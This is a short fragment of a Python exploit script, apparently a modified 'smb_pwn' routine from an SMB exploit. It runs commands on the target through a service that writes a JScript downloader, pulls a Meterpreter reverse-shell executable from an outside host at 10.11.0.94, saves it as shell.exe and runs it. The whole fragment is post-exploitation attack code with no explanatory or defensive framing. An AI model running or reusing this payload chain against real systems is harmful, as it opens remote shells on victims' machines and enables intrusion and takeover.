...
def smb_pwn(conn, arch):
    ...
    print('Executing Service Exec')
	service_exec(conn, r'cmd /c echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", WScript.Arguments(0), /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("shell.exe"); > curl.js && cscript /nologo curl.js "http://10.11.0.94/met_reverse_tcp.exe"')
    service_exec(conn, r'cmd /c c:\WINDOWS\system32\shell.exe')
